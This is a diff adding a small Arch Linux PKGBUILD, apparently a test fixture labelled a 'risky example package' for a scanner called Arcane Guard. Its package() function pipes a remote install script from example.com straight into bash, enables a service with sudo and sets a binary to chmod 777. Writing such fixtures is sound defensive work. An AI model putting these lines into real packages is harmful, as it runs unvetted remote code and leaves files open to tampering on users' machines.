@@ -1,0 +1,14 @@
+pkgname=hello-risky
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="Risky example package for Arcane Guard"
+arch=('x86_64')
+license=('custom')
+source=("https://example.com/fake-binary.AppImage")
+install=hello-risky.install
+
+package() {
+  curl -fsSL https://example.com/install.sh | bash
+  sudo systemctl enable fake.service
+  chmod 777 "$pkgdir/usr/bin/fake"
+}
